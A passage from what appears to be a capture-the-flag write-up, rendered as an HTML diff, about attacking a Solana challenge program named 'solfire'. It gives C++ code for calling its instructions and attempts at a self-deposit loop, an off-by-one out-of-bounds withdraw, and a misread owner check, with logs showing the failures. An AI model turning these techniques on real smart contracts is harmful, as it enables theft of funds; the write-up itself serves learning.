+<span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">system_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="p">}</span>
+<span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">user_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="p">}</span>
+<span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">vault_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="p">}</span>
+<span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">solfire_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="p">}</span>
+<span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">solve_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="p">}</span>
+<span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">balances_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="p">}</span>
+
+
+<span class="kt">uint8_t</span> <span class="nf">solfire_bump_seed</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="p">}</span>
+<span class="kt">uint8_t</span> <span class="nf">balances_bump_seed</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="p">}</span>
+<span class="kt">uint8_t</span> <span class="nf">vault_bump_seed</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Finally some functions to start calling the solfire program.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">create_account</span><span class="p">(</span><span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">balances</span><span class="p">,</span> <span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">funder</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">seed_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'A'</span><span class="p">,</span> <span class="n">balances_bump_seed</span><span class="p">()</span> <span class="p">};</span>
+    <span class="n">SolSignerSeed</span> <span class="n">seed</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="n">seed_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">seed_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="k">const</span> <span class="n">SolSignerSeeds</span> <span class="n">signers_seeds</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="p">{</span> <span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">1</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">SolAccountMeta</span> <span class="n">meta</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">c1ock_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">system_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="c1">// The account to be created:</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">balances</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">},</span>
+        <span class="c1">// This account is unused, using system/null:</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">system_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">funder</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">CreateAccountInput</span> <span class="n">ix_data</span> <span class="p">{</span> <span class="p">.</span><span class="n">bump_seed</span> <span class="o">=</span> <span class="n">solfire_bump_seed</span><span class="p">()</span> <span class="p">};</span>
+
+    <span class="n">SolInstruction</span> <span class="n">instruction</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">program_id</span> <span class="o">=</span> <span class="n">solfire_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">accounts</span> <span class="o">=</span> <span class="n">meta</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">account_len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">meta</span><span class="p">),</span>
+        <span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ix_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ix_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="n">sol_invoke_signed</span><span class="p">(</span><span class="o">&amp;</span><span class="n">instruction</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka_num</span><span class="p">,</span> <span class="n">signers_seeds</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">deposit</span><span class="p">(</span><span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">balances</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">lamports</span><span class="p">,</span> <span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">funder</span><span class="p">,</span> <span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">recipient</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">balance_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">SolAccountMeta</span> <span class="n">meta</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">c1ock_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">system_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">balances</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">funder</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">recipient</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">DepositInput</span> <span class="n">ix_data</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">balance_index</span> <span class="o">=</span> <span class="n">balance_index</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">lamports</span> <span class="o">=</span> <span class="n">lamports</span><span class="p">,</span>
+    <span class="p">};</span>
+
+    <span class="n">SolInstruction</span> <span class="n">instruction</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">program_id</span> <span class="o">=</span> <span class="n">solfire_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">accounts</span> <span class="o">=</span> <span class="n">meta</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">account_len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">meta</span><span class="p">),</span>
+        <span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ix_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ix_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="n">sol_invoke</span><span class="p">(</span><span class="o">&amp;</span><span class="n">instruction</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka_num</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">withdraw</span><span class="p">(</span><span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">balances</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">lamports</span><span class="p">,</span> <span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">funder</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">balance_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">SolAccountMeta</span> <span class="n">meta</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">c1ock_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">system_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">balances</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">recipient</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">funder</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">WithdrawInput</span> <span class="n">ix_data</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">balance_index</span> <span class="o">=</span> <span class="n">balance_index</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">lamports</span> <span class="o">=</span> <span class="n">lamports</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">vault_bump_seed</span> <span class="o">=</span> <span class="n">vault_bump_seed</span><span class="p">()</span>
+    <span class="p">};</span>
+
+    <span class="n">SolInstruction</span> <span class="n">instruction</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">program_id</span> <span class="o">=</span> <span class="n">solfire_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">accounts</span> <span class="o">=</span> <span class="n">meta</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">account_len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">meta</span><span class="p">),</span>
+        <span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ix_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ix_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="n">sol_invoke</span><span class="p">(</span><span class="o">&amp;</span><span class="n">instruction</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka_num</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Then finally this can be used to work with the potentially expected naive non-exploited workflow, creating an account depositing 5 lamports and withdrawing them again.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint32_t</span> <span class="n">lamports</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+<span class="n">create_account</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+<span class="n">deposit</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">lamports</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">vault_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+<span class="n">withdraw</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">lamports</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">vault_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="deposit-bug">Deposit bug</h2>
+
+<p>The first bug that I spotted was that <code class="language-plaintext highlighter-rouge">handle_deposit</code> doesn’t validate that the accounts specified aren’t the same account or that the solana account is in anyway associated with the funder and recipient.</p>
+
+<p>So this means that we could specify the user account with it’s balance that we already start with as signed to transfer money to itself, until the solfire owned account gets it’s deposit amount up to 50k amount.</p>
+
+<p>So let’s slightly change the approach we are doing</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint32_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mi">50'000</span><span class="p">;</span>
+<span class="n">create_account</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+<span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">user_account</span><span class="p">().</span><span class="n">lamports</span> <span class="o">&lt;</span> <span class="n">target</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">deposit</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="o">*</span><span class="n">user_account</span><span class="p">().</span><span class="n">lamports</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">withdraw</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">vault_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Unfortunately when attempting to this we exceed the maximum number of instructions</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>....truncated
+Program log: Solfire start
+Program log: handle_deposit
+Program 11111111111111111111111111111111 invoke [3]
+Program 11111111111111111111111111111111 success
+Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 44303 of 62667 compute units
+Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn success
+Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn invoke [2]
+Program log: Solfire start
+Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 17282 of 17282 compute units
+Program failed to complete: exceeded maximum number of instructions allowed (17282) at instruction #204
+Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn failed: Program failed to complete
+Program EGuk7HfhxRAHWGsBw2sayNKY8tTPgCsWkGto57krYTj9 consumed 200000 of 200000 compute units
+Program EGuk7HfhxRAHWGsBw2sayNKY8tTPgCsWkGto57krYTj9 failed: Program failed to complete
+</code></pre></div></div>
+
+<p>I did try attempting to increase perform a call to the compute budget program to get more, but this was unsuccessful.</p>
+
+<h2 id="buffer-overflow-bug">Buffer overflow bug</h2>
+
+<p>The index into the balances account the bounds check for it within <code class="language-plaintext highlighter-rouge">handle_withdraw</code> and <code class="language-plaintext highlighter-rouge">handle_deposit</code> is the following</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="mi">640</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="n">ulonglong</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">in_data</span><span class="o">-&gt;</span><span class="n">entry_index</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">sol_panic_</span><span class="p">(</span><span class="s">"./src/solfire/solfire.c"</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>However the buffer size allocated is 10240 bytes, and the <code class="language-plaintext highlighter-rouge">Balance</code> structure that it’s indexing is 16 bytes, so while it can have a maximum of 640 entries, it’s checking the index which index 640 is actually the 641st entry, as indexes count from 0.</p>
+
+<p>So let’s try doing a withdrawal on that value, just hope that what it run’s into has something which can be treated as <code class="language-plaintext highlighter-rouge">Balance::deposits</code> with a large enough value.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint32_t</span> <span class="n">lamports</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="kt">uint32_t</span> <span class="n">balance_index</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span>
+<span class="n">create_account</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+<span class="n">withdraw</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">lamports</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">vault_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">balance_index</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Unfortunately this didn’t work</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Program log: handle_withdraw
+Program 11111111111111111111111111111111 invoke [3]
+Program 11111111111111111111111111111111 success
+Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 44353 of 153440 compute units
+Program failed to complete: BPF program Panicked in ./src/solfire/solfire.c at 175:0
+</code></pre></div></div>
+
+<p>Unfortunate, however it’s worth looking at how this deserializes, to understand what that data is inside <a href="https://github.com/solana-labs/solana/blob/04c0c608a36ea9ebacf6cb96a221ed895fd02cb0/sdk/bpf/c/inc/sol/deserialize.h#L98-L102"><code class="language-plaintext highlighter-rouge">sol_deserialize</code></a></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define MAX_PERMITTED_DATA_INCREASE (1024 * 10)
+</span></code></pre></div></div>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// account data</span>
+<span class="n">params</span><span class="o">-&gt;</span><span class="n">ka</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data_len</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">input</span><span class="p">;</span>
+<span class="n">input</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>
+<span class="n">params</span><span class="o">-&gt;</span><span class="n">ka</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">input</span><span class="p">;</span>
+<span class="n">input</span> <span class="o">+=</span> <span class="n">params</span><span class="o">-&gt;</span><span class="n">ka</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data_len</span><span class="p">;</span>
+<span class="n">input</span> <span class="o">+=</span> <span class="n">MAX_PERMITTED_DATA_INCREASE</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>So it looks like after the data there is always another unused 10kb, we can look a little further how this from the serialization side in <a href="https://github.com/solana-labs/solana/blob/ddd9d5a5a54f89f69561adf4814d64162f0b5212/programs/bpf_loader/src/serialization.rs#L279-L283"><code class="language-plaintext highlighter-rouge">serialize_parameters_aligned</code></a>.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v</span><span class="nf">.resize</span><span class="p">(</span>
+    <span class="n">MAX_PERMITTED_DATA_INCREASE</span>
+        <span class="o">+</span> <span class="p">(</span><span class="n">v</span><span class="nf">.write_index</span><span class="p">()</span> <span class="k">as</span> <span class="o">*</span><span class="k">const</span> <span class="nb">u8</span><span class="p">)</span><span class="nf">.align_offset</span><span class="p">(</span><span class="n">BPF_ALIGN_OF_U128</span><span class="p">),</span>
+    <span class="mi">0</span><span class="p">,</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<p>So it seems like this is not really useable, it’s just a bunch of 0’s which won’t really work well as our balance.</p>
+
+<h2 id="owner-check-bug">Owner check bug</h2>
+
+<p>UPDATE: Thanks to Voltara for pointing out this was not actually a bug, just my poor reading of the code, it’s still checking all bytes, the <code class="language-plaintext highlighter-rouge">+ 2</code> because of the early out checks before.</p>
+
+<p>Looking at the owner checks within deposit and withdraw, it seems like it’s only looking at every second byte</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">in_program_id</span> <span class="o">=</span> <span class="n">input</span><span class="o">-&gt;</span><span class="n">program_id</span><span class="p">;</span>
+  <span class="n">in_account_2</span> <span class="o">=</span> <span class="n">in_accounts</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">owner</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">longlong</span> <span class="o">*</span><span class="p">)</span><span class="n">in_account_2</span><span class="o">-&gt;</span><span class="n">x</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="n">longlong</span> <span class="o">*</span><span class="p">)</span><span class="n">in_program_id</span><span class="o">-&gt;</span><span class="n">x</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* Check in_accounts[2].owner == input-&gt;program_id */</span>
+    <span class="n">uVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">longlong</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_account_2</span><span class="o">-&gt;</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="n">longlong</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_program_id</span><span class="o">-&gt;</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">uVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">do</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">uVar2</span> <span class="o">==</span> <span class="mi">30</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LBB10_15</span><span class="p">;</span>
+        <span class="n">lVar3</span> <span class="o">=</span> <span class="n">uVar2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// &lt;==  Increment by 2 bytes (UPDATE: This is wrong it's +2 because of early-out checks)</span>
+        <span class="n">lVar4</span> <span class="o">=</span> <span class="n">uVar2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="n">uVar2</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">longlong</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_account_2</span><span class="o">-&gt;</span><span class="n">x</span> <span class="o">+</span> <span class="n">lVar3</span><span class="p">)</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="n">longlong</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_program_id</span><span class="o">-&gt;</span><span class="n">x</span> <span class="o">+</span> <span class="n">lVar4</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mi">30</span> <span class="o">&lt;</span> <span class="n">uVar2</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LBB10_15</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">sol_panic_</span><span class="p">(</span><span class="s">"./src/solfire/solfire.c"</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">LBB10_15</span><span class="o">:</span>
+</code></pre></div></div>
+
+<p>The first thing I looked at with this, if there is away to make the binary which we provide match this the public key except for one byte, I noticed that the public key always seemed to be different when building, so I hoped it might have been part of the build system, but unfortunately it seemed to be <a href="https://github.com/neodyme-labs/solana-poc-framework/blob/2f275b2f608986265105acc16fb8a2ed12b22612/src/lib.rs#L288-L292">SHA-256 hash of the program</a>.</p>
+
+<p>The second idea that I had for this was to see if I could load from within the program using <a href="https://docs.solana.com/developing/runtime-facilities/programs#bpf-loader">BPF loader again with a new binary</a> which matches this ID.</p>
+
+<p>The first thing that I need to do for this was adding the BPF loader account</p>
+
